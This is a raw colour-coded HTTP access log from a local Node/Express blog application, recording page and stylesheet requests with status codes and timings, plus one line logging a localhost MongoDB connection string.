[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.728 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.855 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.728 ms - 913[0m
[0mGET / [32m200 [0m0.904 ms - 844[0m
[0mGET / [32m200 [0m0.898 ms - 844[0m
[0mGET / [32m200 [0m0.933 ms - 844[0m
[0mGET / [32m200 [0m1.765 ms - 844[0m
[0mGET / [32m200 [0m0.930 ms - 844[0m
[0mGET / [32m200 [0m0.908 ms - 844[0m
[0mGET / [32m200 [0m0.884 ms - 844[0m
[0mGET / [32m200 [0m0.948 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.807 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.870 ms - 913[0m
[0mGET / [36m304 [0m0.906 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.355 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.422 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.896 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.761 ms - 913[0m
[0mGET / [36m304 [0m0.860 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.335 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.434 ms - -[0m
[0mGET /blogs [36m304 [0m0.907 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.322 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.401 ms - -[0m
[0mGET /blogs/add [36m304 [0m0.935 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.321 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.450 ms - -[0m
[0mGET / [36m304 [0m0.913 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.330 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.417 ms - -[0m
[0mGET /blogs [36m304 [0m1.837 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.666 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.840 ms - -[0m
[0mGET / [36m304 [0m0.998 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.346 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.392 ms - -[0m
[0mGET /blogs [36m304 [0m0.971 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.314 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.407 ms - -[0m
[0mGET / [36m304 [0m1.064 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.309 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.449 ms - -[0m
[0mGET /blogs [36m304 [0m0.923 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.322 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.427 ms - -[0m
[0mGET / [36m304 [0m0.910 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.334 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.420 ms - -[0m
[0mGET / [36m304 [0m0.958 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.674 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.780 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.449 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.462 ms - -[0m
[0mGET /css/bootstrap.min.css.map [32m200 [0m2.715 ms - 646357[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.736 ms - 913[0m
Mongoose connected to mongodb://blogs:blogs1234@localhost:27017/blogger
[0mGET / [32m200 [0m13.148 ms - 844[0m
[0mGET /stylesheets/style.css [32m200 [0m3.781 ms - 354[0m
[0mGET /css/bootstrap.min.css [32m200 [0m4.692 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.487 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.771 ms - 2221[0m
[0mGET /stylesheets/style.css [36m304 [0m0.733 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.531 ms - -[0m
[0mGET /blogs/add [36m304 [0m2.154 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.922 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.245 ms - -[0m
[0mGET /blogs [36m304 [0m1.429 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.772 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.014 ms - -[0m
[0mGET /blogs [32m200 [0m49.465 ms - 2221[0m
[0mGET /stylesheets/style.css [32m200 [0m3.236 ms - 354[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.985 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m8.727 ms - 1418[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m9.438 ms - 1413[0m
[0mGET /blogs [32m200 [0m1.440 ms - 2221[0m
[0mGET /stylesheets/style.css [32m200 [0m1.046 ms - 354[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.334 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.177 ms - 1418[0m
[0mGET /blogs [36m304 [0m1.297 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.835 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.013 ms - -[0m
[0mGET / [36m304 [0m2.523 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.925 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.115 ms - -[0m
[0mGET /blogs [36m304 [0m1.236 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.375 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.500 ms - -[0m
[0mGET /blogs/edit [32m200 [0m1.382 ms - 772[0m
[0mGET /stylesheets/style.css [36m304 [0m0.390 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.507 ms - -[0m
[0mGET /blogs/delete [32m200 [0m1.294 ms - 776[0m
[0mGET /stylesheets/style.css [36m304 [0m0.446 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.500 ms - -[0m
[0mGET / [36m304 [0m1.058 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.803 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.928 ms - -[0m
[0mGET / [32m200 [0m0.997 ms - 844[0m
[0mGET /stylesheets/style.css [32m200 [0m0.579 ms - 354[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.697 ms - 160302[0m
[0mGET /css/bootstrap.min.css.map [32m200 [0m1.694 ms - 646357[0m
[0mGET /favicon.ico [33m404 [0m0.931 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.119 ms - 2221[0m
[0mGET /stylesheets/style.css [36m304 [0m0.425 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.460 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.638 ms - -[0m
[0mGET / [36m304 [0m1.035 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.382 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.479 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.549 ms - -[0m
[0mGET /blogs/add [32m200 [0m1.237 ms - 771[0m
[0mGET /stylesheets/style.css [36m304 [0m0.444 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.488 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.583 ms - -[0m
[0mGET /blogs [36m304 [0m1.163 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.438 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.464 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.551 ms - -[0m
[0mGET /blogs/edit [32m200 [0m1.198 ms - 772[0m
[0mGET /stylesheets/style.css [36m304 [0m0.409 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.528 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.498 ms - -[0m
[0mGET /blogs [36m304 [0m1.099 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.444 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.484 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.620 ms - -[0m
[0mGET /blogs/delete [32m200 [0m1.291 ms - 776[0m
[0mGET /stylesheets/style.css [36m304 [0m0.479 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.516 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.627 ms - -[0m
[0mGET /blogs [36m304 [0m1.090 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.625 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.333 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.527 ms - -[0m
[0mGET /blogs/edit [36m304 [0m1.035 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.422 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.482 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.579 ms - -[0m
[0mGET /blogs [36m304 [0m2.193 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.775 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.966 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.532 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.537 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.458 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.473 ms - -[0m
[0mGET / [36m304 [0m1.902 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.410 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.452 ms - -[0m
[0mGET / [36m304 [0m1.149 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.376 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.454 ms - -[0m
[0mGET / [36m304 [0m0.923 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.502 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.340 ms - -[0m
[0mGET /blogs [36m304 [0m1.140 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.352 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.495 ms - -[0m
[0mGET /blogs/add [36m304 [0m0.994 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m29.443 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.313 ms - -[0m
[0mGET / [36m304 [0m0.979 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.724 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.830 ms - -[0m
[0mGET /blogs [36m304 [0m1.107 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.819 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.987 ms - -[0m
[0mGET /blogs/edit [36m304 [0m1.017 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.852 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.830 ms - -[0m
[0mGET / [36m304 [0m1.042 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.492 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.302 ms - -[0m
[0mGET /blogs/add [36m304 [0m0.981 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.374 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.458 ms - -[0m
[0mGET /blogs [36m304 [0m1.071 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.714 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.914 ms - -[0m
[0mGET /blogs/delete [36m304 [0m1.091 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.695 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.839 ms - -[0m
[0mGET /blogs [36m304 [0m1.077 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.370 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.457 ms - -[0m
[0mGET /blogs/edit [36m304 [0m1.024 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.409 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.460 ms - -[0m
[0mGET /blogs [36m304 [0m1.122 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.343 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.472 ms - -[0m
[0mGET / [36m304 [0m2.036 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.400 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.468 ms - -[0m
[0mGET / [36m304 [0m1.026 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.457 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.239 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.838 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.359 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.452 ms - -[0m
[0mGET /blogs [36m304 [0m1.139 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.345 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.467 ms - -[0m
[0mGET /blogs/edit [36m304 [0m2.182 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.796 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.948 ms - -[0m
[0mGET /blogs [36m304 [0m1.092 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.404 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.458 ms - -[0m
[0mGET /blogs/delete [36m304 [0m1.929 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.381 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.495 ms - -[0m
[0mGET / [36m304 [0m0.961 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.761 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.888 ms - -[0m
[0mGET /blogs [36m304 [0m2.076 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.357 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.438 ms - -[0m
[0mGET /blogs/edit [36m304 [0m0.974 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.744 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.848 ms - -[0m
[0mGET /blogs/add [36m304 [0m1.034 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.426 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.454 ms - -[0m
[0mGET /blogs [36m304 [0m1.225 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.690 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.887 ms - -[0m
[0mGET /blogs/delete [36m304 [0m0.964 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.605 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.882 ms - -[0m
[0mGET /blogs [36m304 [0m1.184 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.398 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.448 ms - -[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.943 ms - 1413[0m
[0mGET / [36m304 [0m0.935 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.319 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.424 ms - -[0m
[0mGET /blogs [32m200 [0m8.489 ms - 2671[0m
[0mGET /stylesheets/style.css [36m304 [0m0.351 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.506 ms - -[0m
[0mGET /blogs [32m200 [0m1.445 ms - 2671[0m
[0mGET /stylesheets/style.css [32m200 [0m1.113 ms - 354[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.231 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.836 ms - 1418[0m
[0mGET /blogs [32m200 [0m190.612 ms - 2732[0m
[0mGET /stylesheets/style.css [32m200 [0m7.846 ms - 354[0m
[0mGET /css/bootstrap.min.css [32m200 [0m20.903 ms - 160302[0m
[0mGET /css/fontawesome-all.css [33m404 [0m16.281 ms - 963[0m
[0mGET /favicon.ico [33m404 [0m2.215 ms - 1418[0m
[0mGET /blogs [32m200 [0m40.090 ms - 2732[0m
[0mGET /stylesheets/style.css [32m200 [0m1.674 ms - 354[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.179 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.842 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m2.215 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.092 ms - 2732[0m
[0mGET /stylesheets/style.css [32m200 [0m0.496 ms - 354[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.848 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.211 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.967 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.120 ms - 2732[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.601 ms - 963[0m
[0mGET /stylesheets/style.css [32m200 [0m2.536 ms - 354[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.136 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.895 ms - 1418[0m
[0mGET /blogs [32m200 [0m52.961 ms - 2783[0m
[0mGET /stylesheets/style.css [32m200 [0m1.289 ms - 354[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.009 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.388 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.828 ms - 1418[0m
[0mGET /blogs/edit [36m304 [0m2.526 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.297 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.495 ms - -[0m
[0mGET /blogs [32m200 [0m1.443 ms - 2828[0m
[0mGET /stylesheets/style.css [32m200 [0m1.221 ms - 354[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.237 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.416 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.949 ms - 1418[0m
[0mGET /blogs/edit [36m304 [0m0.949 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.719 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.752 ms - -[0m
[0mGET /blogs/delete [36m304 [0m1.571 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.320 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.430 ms - -[0m
[0mGET /blogs [32m200 [0m2.542 ms - 2828[0m
[0mGET /stylesheets/style.css [32m200 [0m0.900 ms - 383[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.134 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.117 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.767 ms - 1418[0m
[0mGET /blogs [32m200 [0m6.048 ms - 2834[0m
[0mGET /stylesheets/style.css [32m200 [0m1.120 ms - 383[0m
[0mGET /css/fontawesome-all.css [33m404 [0m0.859 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.280 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.705 ms - 1418[0m
[0mGET /blogs [32m200 [0m2.436 ms - 2891[0m
[0mGET /stylesheets/style.css [32m200 [0m1.236 ms - 383[0m
[0mGET /css/fontawesome-all.css [33m404 [0m0.909 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.375 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.908 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.374 ms - 2834[0m
[0mGET /stylesheets/style.css [32m200 [0m0.762 ms - 383[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.083 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.064 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.743 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.108 ms - 2834[0m
[0mGET /stylesheets/style.css [32m200 [0m1.184 ms - 383[0m
[0mGET /css/fontawesome-all.css [33m404 [0m2.451 ms - 963[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.356 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.802 ms - 1418[0m
[0mGET / [36m304 [0m2.564 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m0.602 ms - 383[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.452 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.938 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.030 ms - 2834[0m
[0mGET /css/fontawesome-all.css [33m404 [0m1.099 ms - 963[0m
[0mGET /stylesheets/style.css [36m304 [0m0.334 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.430 ms - -[0m
[0mGET /blogs [32m200 [0m3.397 ms - 2892[0m
[0mGET /stylesheets/style.css [32m200 [0m1.705 ms - 383[0m
[0mGET /css/bootstrap.min.css [32m200 [0m6.632 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.958 ms - 1418[0m
[0mGET /blogs/edit [36m304 [0m4.882 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.735 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.908 ms - -[0m
[0mGET /blogs [32m200 [0m4.273 ms - 2892[0m
[0mGET /stylesheets/style.css [36m304 [0m0.354 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.434 ms - -[0m
[0mGET /blogs [32m200 [0m2.205 ms - 2886[0m
[0mGET /stylesheets/style.css [32m200 [0m1.521 ms - 383[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.686 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.961 ms - 1418[0m
[0mGET /blogs/edit [36m304 [0m0.911 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.419 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.474 ms - -[0m
[0mGET /blogs [32m200 [0m2.140 ms - 2886[0m
[0mGET /stylesheets/style.css [32m200 [0m0.508 ms - 383[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.586 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.919 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.106 ms - 2886[0m
[0mGET /stylesheets/style.css [32m200 [0m0.555 ms - 383[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.637 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.806 ms - 1418[0m
[0mGET /blogs/delete [36m304 [0m2.650 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.720 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.934 ms - -[0m
[0mGET /blogs [32m200 [0m3.153 ms - 2874[0m
[0mGET /stylesheets/style.css [32m200 [0m0.550 ms - 383[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.562 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.991 ms - 1418[0m
[0mGET /blogs [32m200 [0m3.701 ms - 2874[0m
[0mGET /stylesheets/style.css [32m200 [0m1.153 ms - 383[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.229 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.957 ms - 1418[0m
[0mGET /blogs [32m200 [0m3.742 ms - 2946[0m
[0mGET /stylesheets/style.css [32m200 [0m0.546 ms - 355[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.621 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.950 ms - 1418[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.597 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m0.481 ms - 234[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m2.781 ms - -[0m
[0mGET /blogs [32m200 [0m1.376 ms - 2946[0m
[0mGET /stylesheets/style.css [32m200 [0m3.329 ms - 234[0m
[0mGET /blogs [32m200 [0m1.182 ms - 2946[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.921 ms - 160302[0m
[0mGET /stylesheets/style.css [32m200 [0m0.494 ms - 234[0m
[0mGET /favicon.ico [33m404 [0m0.814 ms - 1418[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.589 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.922 ms - 1418[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.487 ms - -[0m
[0mGET /blogs [32m200 [0m21.207 ms - 2946[0m
[0mGET /stylesheets/style.css [32m200 [0m1.162 ms - 228[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.330 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m3.139 ms - 1418[0m
[0mGET /blogs [36m304 [0m1.149 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.718 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m1.503 ms - 227[0m
[0mGET /blogs/edit [36m304 [0m1.688 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.690 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.857 ms - -[0m
[0mGET /blogs/delete [36m304 [0m0.929 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.642 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.827 ms - -[0m
[0mGET /blogs [32m200 [0m4.160 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.169 ms - 234[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.283 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.881 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.315 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.025 ms - 240[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.113 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.938 ms - 1418[0m
[0mGET /blogs [32m200 [0m5.635 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.109 ms - 240[0m
[0mGET /css/bootstrap.min.css [32m200 [0m2.343 ms - 160302[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.491 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.921 ms - 1418[0m
[0mGET /blogs/edit [36m304 [0m0.952 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.700 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.870 ms - -[0m
[0mGET /blogs/delete [36m304 [0m0.951 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.344 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.470 ms - -[0m
[0mGET /blogs [32m200 [0m1.061 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.183 ms - 285[0m
[0mGET /css/bootstrap.min.css [32m200 [0m2.288 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.981 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.027 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.054 ms - 257[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.179 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.911 ms - 1418[0m
[0mGET /blogs [32m200 [0m2.890 ms - 2304[0m
[0mGET /stylesheets/style.css [32m200 [0m1.093 ms - 239[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.255 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m3.905 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.312 ms - 2310[0m
[0mGET /stylesheets/style.css [32m200 [0m0.468 ms - 239[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.574 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.029 ms - 1418[0m
[0mGET / [36m304 [0m1.624 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m0.586 ms - 239[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.439 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.569 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.821 ms - 1418[0m
[0mGET /blogs [36m304 [0m2.078 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.382 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.427 ms - -[0m
[0mGET /css/bootstrap.min.css.map [36m304 [0m0.540 ms - -[0m
[0mGET /blogs [32m200 [0m1.187 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.000 ms - 272[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.110 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.854 ms - 1418[0m
[0mGET /blogs [32m200 [0m1.063 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m1.109 ms - 312[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.292 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.007 ms - 1418[0m
[0mGET /blogs [32m200 [0m3.755 ms - 2250[0m
[0mGET /stylesheets/style.css [32m200 [0m5.426 ms - 312[0m
